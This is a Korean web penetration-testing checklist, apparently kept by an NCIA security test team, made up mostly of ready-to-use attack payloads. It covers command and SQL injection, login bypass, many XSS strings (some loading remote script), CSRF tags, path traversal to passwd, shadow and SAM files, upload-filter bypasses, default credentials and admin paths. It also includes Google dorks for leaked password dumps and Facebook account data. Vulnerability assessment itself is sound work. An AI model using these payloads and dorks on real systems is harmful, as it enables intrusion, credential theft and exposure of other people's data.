0. 점검Tool 옵션
nikto.pl -h www.xxx.go.kr -o xxx.html
skipfish -B -O -Q -o /skipfish-result/xxx http://www.xxx.go.kr


1. 운영체제 명령실행
;exec master..xp_cmdshell 'ipconfig'
;/bin/ls
;system("cmd.exe dir c:\")
+|+ dir c:\


2. SQL 인젝션
%' and 'a%'='a
%' and 'a%'='b
'and @@version>1--'
and 1=(IS_MEMBER('db_owner'))
;declare@aint;--
and user>0
and 0<>db_name()
+un/**/ion+se/**/lect+1,2,3--
+uni%0bon+se%0blect+1,2,3--

' or 1=1--
' or 1=1#
' or 1=1;
webadmin'--
admin	'or 'a'='a
%27+or+%27%27%3D%27
%27+OR+1%3D1--
' OR '%1%'='%1%'--
%27+OR+%27%251%25%27%3D%27%251%25%27--



3. Xpath 인젝션
‘ or 'a'='a 와 ’ and 'a'='b 또는 or 1=1와 and 1=2 패턴을 전송
아이디에 ‘ or 1=1 or '1'='1을 입력 비밀번호에 임의의 값 입력 시 로그인 가능


4. 디렉토리 인덱싱
/icons/
/servlets/
/images/
/%3f.jsp
intitle:index of site:도메인명


5. 정보누출
‘ or 1=2--'


7. 크로스사이트 스크립팅
="" onMouseOver="alert(document.cookie)
="" onMouseOver="alert('XSS')
%3D%22%22+onMouseOver%3D%22alert%28%27XSS%27%29
"onMouseOver="alert(document.cookie)
<p onMouseOver="alert(document.cookie);">
<P onmouseover=alert(document.cookie);>test</P>
<P onmouseover=alert(XSS);>test</P>
<script>alert(document.cookie)</script>
"><script>alert(document.cookie)</script>
"><script>alert('XSS');</script>
<embed allowscriptaccess="always"src="http://0x.lv/xss.swf"> </embed>
javascript:alert('XSS')
%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%1c%3e%3c%73%63%72%69%70%74%3e%20%61%6c%65%72%74%28%18%58%53%53%27%29%3b%3c%2f%73%63%72%69%70%74%3e
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<IMG SRC="javascript:alert('XSS')"
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<BODY ONLOAD=alert('XSS')>
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" AllowScriptAccess="always"></EMBED>

<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>

<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->


8. 브루트포스
취약한 계정 :  admin, administrator, manager, guest, test, scott, tomcat, root user, operator, anonymous, weblogic, webmaster, super
취약한 패스워드 : abcd, aaaa, 1234, 1111, test, password, public, passwd, blank 패스워드, 계정과 동일한 패스워드
weblogic/weblogic, webmaster/1234 등
 admin/관리자이름
 administrator/관리자이름
 admin/1
 super/~~
 site이름/site이름
 park/1111
 site이름admin/~~


12. 불충분한 인가
글쓰기 예 - board.php?mode=list에서 mode값을 write, add, insert 등으로 변경
글 수정 예 - board.php?mode=view&idx=1에서 mode값을 update, modify, edit 등으로 변경
글 삭제 예 - board.php?mode=delete&idx=1에서 idx값을 다른 게시물 번호로 변경
admin/login.jsp
admin/admin_login.jsp
admin/admin.jsp
admin/mem_list.jsp
notice/write.jsp


14. 크로스사이트 리퀘스트 변조
<img width=0 height=0 src="http://test.com/write_ok.php?

cmdProc=write&name=test&passwd=test&title=nciaTest2&body=test">


17. 파일 다운로드
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/host
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/shadow
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/network/interfaces
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//boot.ini
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//winnt/win.ini
[파일명]%00.jpg, [파일명]%0a.jpg
./.././.././.././.././.././../etc/passwd
./.././.././.././.././.././../winnt/win.ini
./.././.././.././.././.././../boot.ini


18. 파일 업로드
[파일명].jsp%00.jpg, [파일명].jsp%0a.jpg, [파일명].jsp%zz.jpg
[파일명].js%70 - %70 == p
[파일명].jsp;.jpg, [파일명].jsp?.jpg  -  IIS 버그
[파일명].jpg.[국가코드] (index.php.kr) - Apache의 AddLanguage라는 옵션 취약점
[파일명].jpg.[언어코드] (index.php.iso8859-8) - Apache의 AddLanguage라는 옵션 취약점


19. 관리자 페이지 노출
?action=admin
/admin, /manager, /master, /administrator, /system
abc.go.kr/manager/html
abc.go.kr:8080/manager/html
abc.go.kr:7001/console
abc.go.kr:7090/admin
abc.go.kr:9090/admin
abc.go.kr:9043/admin
abc.go.kr:8080/resin-admin
abc.go.kr/:7001/console
7001, 8000, 8080, 8443, 8888 
/admin/main.asp, admin/menu.html, admin/member_list.php
site:www.xxx.com inurl:admin
site:www.xxx.com inurl:manager


20. 경로추적
./.././.././.././.././.././../etc/passwd
./.././.././.././.././.././../winnt/win.ini
./.././.././.././.././.././../boot.ini


21. 위치 공개
admin_admin_list.asp.bak
index.bak
/WEB-INF/web.xml
/console/login/LoginForm.jsp
/examples/servlets/index.html
/CVS/Entries
/ckfinder/ckfinder.html
/namoCrossE/
/HR/cross/document/
/cross/document/
/OZServlet/server
/phpmyadmin
admin_admin_list.asp.bak
index.bak
db_convert2.asp.bak
db스키마
common/conn.bak
:8080/index.jsp
:8080/admin
:8080/manager/html
/brd/admin/adminMain.jsp
/manage
/manage/login/login.asp
/adimin/mgr/mgr0201.asp
/maker.html
/admin/login.htm
.bak, .backup, .org, .old, .zip, .log, .sql, .new, .txt, .tmp, .temp
cgi-bin, servlets-examples, samples, iisHelp, server-info, jsp-examples, 
dbcon.inc, manual, usage, iissamples, scripts, iisHelp, IISAdmin, _vit_bin, 
Printers, phpinfo.php, examples, jsp, servlets
test.jsp
test.php
test.asp


22. 웹 서비스 메소드 설정 공격

telnet www.kkk.com 80
OPTIONS *　HTTP/1.0


* Brup Repeater 사용시 코드

OPTIONS / HTTP/1.1
Host: abc.go.kr
Content-Length: 2


PUT /ncia.txt HTTP/1.1   ==> state code 201

perform vulnerability assessment 

We are Security-TestTeam in NCIA



DELETE /ncia.txt HTTP/1.1   ==> state code 204



************************************************************************************************

***


01.구글링검색 ------------------------------------------------------------

 > 디렉터리 인덱싱
 > 정보누출
 > 관리자 페이지 노출

* 디렉토리 인덱싱
intitle:index of site:www.abc.go.kr

* 상용툴 사용
inurl:innoAP site:www.abc.go.kr
inurl:FCKeditor site:www.abc.go.kr
inurl:ckfinder site:www.abc.go.kr
inurl:ckeditor site:www.abc.go.kr
inurl:namoCrossE site:www.abc.go.kr
inurl:OZServlet site:www.abc.go.kr
inurl:xinha site:www.abc.go.kr
inurl:crosseditor site:www.abc.go.kr
inurl:HTMLarea site:www.abc.go.kr
inurl:smart_editor site:www.abc.go.kr
inurl:tinymce site:www.abc.go.kr

* 파일 다운로드
inurl:file site:www.abc.go.kr
inurl:down site:www.abc.go.kr

./.././.././.././.././.././../etc/passwd
./.././.././.././.././.././../winnt/win.ini
./.././.././.././.././.././../boot.ini
imgloader.jsp
imageViewer.jsp?imagesrc=http://....
%2E%2E%2F
..%2F

* 로그인 관련
admin | login | passwd | password | userid | manager site:www.abc.go.kr
intitle:관리자 inurl:admin site:www.abc.go.kr
inurl:manager site:www.abc.go.kr

* 비정상 파일 검색
-ext:html -ext:htm -ext:shtml -ext:asp -ext:jsp -ext:do -ext:hwp site:www.abc.go.kr

* 웹서버정보
intitle:index.of "server at" site:www.abc.go.kr

* 패스워드 파일
intext:mysql_connect filetype:txt site:www.abc.go.kr

* 에러 페이지
unexpected and of SQL command site:www.abc.go.kr

* 중요정보
allintext:대외비 site:www.abc.go.kr

* 텍스트 파일 내의 root 문자열 검색
filetype:txt intext:'root' site:www.abc.go.kr

* 사이트 전체 검색
site:www.abc.go.kr

* 확장자 SQL 파일의 내용 검색
ext:sql intext:@gmail.com intext:password

* hide my wordpress 검색
allinurl:/hide_my_wp=

* facebook account 검색
intext:charset_test= email= default_persistent=



02.검색서비스 ------------------------------------------------------------

 > SQL 인젝션
%' and 'a%'='a
%' and 'a%'='b

 - 크로스사이트 스크립팅
="" onMouseOver="alert(document.cookie)
="" onMouseOver="alert('XSS')
"onMouseOver="alert(document.cookie)
"><script>alert(document.cookie)</script>
"><script>alert('XSS')</script>

<P onmouseover=alert(document.cookie);>test</P>
<script>alert(document.cookie)</script>



03.회원가입 ------------------------------------------------------------

 > 불충분한 인증
버프를 이용한 회원가입시 실명변조

 - 데이터 평문전송
버프를 이용한 평문전송여부 확인




04.로그인 ------------------------------------------------------------

 > 정보누출
없는 ID 와 실제 ID 비밀번호 오류 발생 메세지 확인

 > SQL 인젝션
로그인 인증우회
' or 1=1--
' or 1=1#
' or 1=1;
webadmin'--
admin 'or 'a'='a

 > 브루스포스
취약한 계정 :  
admin, administrator, manager, guest, test, 
scott, tomcat, root user, operator, anonymous, weblogic, 
webmaster, super

 > 취약한 패스워드 : 
abcd, aaaa, 1234, 1111, test, password, public, passwd, 
blank 패스워드, 계정과 동일한 패스워드
weblogic/weblogic, webmaster/1234 등

admin/관리자이름
administrator/관리자이름
admin/1
super/~~
site이름/site이름
park/1111
site이름admin/~~

회원가입 또는 회원정보변경시 패스워드 정책이 없으면 취약

 > 취약한 패스워드 복구
웹상에서 얻은 정보를 바탕으로 다른 사용자가 비밀번호를 탈취할 수 있으면 취약

 > 세션예측
세션의 패턴을 예측

 > 불충분한 세션관리
로그인시 세션복사 -> 일정시간 후 로그인 시 같은 세션으로 로그인 되는지 확인
다른 브라우져로 이중 로그인 가능한지 그때 세션이 어떻게 되는지 확인 -> 물어볼것

 > 관리자 페이지 노출
/admin, /manager, /master, /administrator, /system
abc.go.kr/manager/html
abc.go.kr:8080/manager/html
abc.go.kr:7001/console
abc.go.kr:7090/admin
abc.go.kr:9090/admin
abc.go.kr:9043/admin
abc.go.kr:8080/resin-admin
abc.go.kr/webadmin
7001, 8000, 8080, 8443, 8888 
/admin/main.asp, admin/menu.html, admin/member_list.php
site:www.xxx.com inurl:admin
site:www.xxx.com inurl:manager

 > 데이터 평문전송
로그인시 평문전송여부 확인

 > 쿠키변조
프락시 도구를 이용하여 로그인시 쿠키값에 개인식별정보가 있는지 확인 -> 쿠키값변경




05.회원정보확인 ------------------------------------------------------------

 > 데이터 평문전송
버프를 이용하여 평문전송여부 확인



06.게시판 ------------------------------------------------------------

 > 운영체제 명령실행
URL변조이용
filename=
;exec master..xp_cmdshell 'ipconfig'
;/bin/ls
;system("cmd.exe dir c:\")
+|+ dir c:\

>> SQL 인젝션
>>> 게시판 검색란
%' and 'a%'='a
%' and 'a%'='b
>>> URL 삽입
 and 1=1--
 and 1=2--

>> 크로스사이트 스크립팅 - Request 패킷만 변조
>>> 게시판 검색란 또는 URL 뒤
="" onMouseOver="alert(document.cookie)
="" onMouseOver="alert('XSS')
"onMouseOver="alert(document.cookie)
"><script>alert(document.cookie)</script>
"><script>alert('XSS')</script>

>>> 크로스사이트 리퀘스트 변조
<img width=0 height=0 src="">

>> 불충분한 인증
글쓰기시 실명변조

>> 불충분한 인가
글쓰기 예 - board.php?mode=list에서 mode값을 write, add, insert 등으로 변경
글 수정 예 - board.php?mode=view&idx=1에서 mode값을 update, modify, edit 등으로 변경
글 수정 예 - selectBoardArticle.do -> forUpdateBoardArticle.do 등으로 변경
글 삭제 예 - board.php?mode=delete&idx=1에서 idx값을 다른 게시물 번호로 변경
admin/login.jsp
admin/admin_login.jsp
admin/admin.jsp
admin/mem_list.jsp
notice/write.jsp

>> 글쓰기 내용란 또는 댓글란 -> HTML허용
<P onmouseover=alert(document.cookie);>취약점점검</P>
<P onmouseover=alert(document.cookie);>test</P>
<P onmouseover=alert('XSS');>test</P>
<BODY onload=alert("XSS")>
<script>alert(document.cookie)</script>

 > 크로스사이트 리퀘스트 변조
 > 자동화공격
 > 파일업로드

 > 파일다운로드 ( : → %3A , / → %2F , . -> %2e )
./.././.././.././.././.././../etc/passwd
./.././.././.././.././.././../winnt/win.ini
./.././.././.././.././.././../boot.ini
./.././.././.././.././.././../winnt/repair/sam
./.././.././.././.././.././../windows/repair/sam
imgloader.jsp
imageViewer.jsp?imagesrc=http://....
%2E%2E%2F
..%2F

 > 경로추적
./.././.././.././.././.././../etc/passwd
./.././.././.././.././.././../winnt/win.ini
./.././.././.././.././.././../boot.ini
./.././.././.././.././.././../winnt/repair/sam
./.././.././.././.././.././../windows/repair/sam

 > 데이터 평문전송
글저장시 글 비밀번호 및 개인정보(주민번호)등이 평문전송 되는지 확인

> 파일업로드 (우회)
ncia.js%70
ncia.asp;.jpg	=> 이상태로 올림
image/pjpeg



07.자료실  ------------------------------------------------------------

 > 운영체제 명령실행
URL변조이용
filename=
;exec master..xp_cmdshell 'ipconfig'
;/bin/ls
;system("cmd.exe dir c:\")
+|+ dir c:\

> Command Injection
www.abc.go.kr/admin/read.php?fn=manual.txt;ls -al
www.abc.go.kr/bbs/download.php?filename=;/bin/ls

 > SQL 인젝션
 > 파일다운로드
 > 경로추적


08.Fckeditor  ------------------------------------------------------------

inurl:/FCKeditor/editor/
 > 취약점 경로
/FCKeditor/editor/filemanager/browser/default/connectors/test.html
/FCKeditor/editor/filemanager/upload/test.html
/FCKeditor/editor/filemanager/browser/default/browser.html?

Type=File&Command=GetFoldersAndFiles&Connector=connectors/asp/connector.asp


09.Namo Crosseditor2  ------------------------------------------------------------

 > 취약점 경로
/cross/index.jsp
/cross/document/install_guide/body_apply.htm
/cross/document/install_guide/body_install_guide.htm
/namo/config/htmls/document/install_guide/body_apply.htm
/namo/cross/document/install_guide/body_apply.htm


10.코드 변경 게시판 공격  ------------------------------------------------------------

<p><input type="Write" value="Write" class="Write" onclick="goSearch()" alt="Write" /></p>
<a href="javascript:writeAction()" class="Write"><span>Write</span></a>


11.Directory Traversal  ------------------------------------------------------------

telnet 192.168.0.100 8080
GET/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwdHTTP/1.0


http://www.example.com/shop.php?html=product../../../../../../../etc/passwd%00

다음과 같이 GET변수에 data_file로 지정된 파일을 표시하는 구조가 대표적인 취약한 예이다.
<?php
    readfile( '/home/html/data/' . $_GET['data_file'] );
?>
참고: 위 공격 URL 맨 뒤에 붙인 %00은 널바이트로서 뒤에 확장자가 붙는 경우에는 이 널바이트를 사용하여 확장자를 무시하게 된다

체크 포인트(php)
제어구조: include, include_once, require, require_once
함수: fopen(), file(), copy(), unlink() 와 같은 파일 시스템류
      system(), exec(), passthru() 와 같은 프로그램 실행류

12.OS 취약점  ------------------------------------------------------------
weblogic Method Vul
  - GET 또는 POST Method를 OPTIONS, DELETE 로 변경시 로그인창을 열수 있는 취약점
  - 패킷 내용에 WWW-Authenticate: Basic realm="WebLogic Server" 메세지가 있을 경우 확인 필요
